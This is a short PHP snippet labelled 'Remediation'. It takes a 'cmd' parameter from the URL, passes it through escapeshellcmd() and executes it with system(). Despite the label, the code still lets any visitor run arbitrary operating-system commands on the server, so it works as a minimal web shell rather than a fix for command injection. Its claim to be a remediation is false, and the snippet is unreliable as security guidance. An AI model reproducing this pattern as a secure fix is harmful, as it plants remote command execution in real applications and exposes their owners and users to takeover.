<?php 
// Remediation
$cmd = $_GET['cmd'];
$cmd = escapeshellcmd($cmd);
system($cmd);

?> 
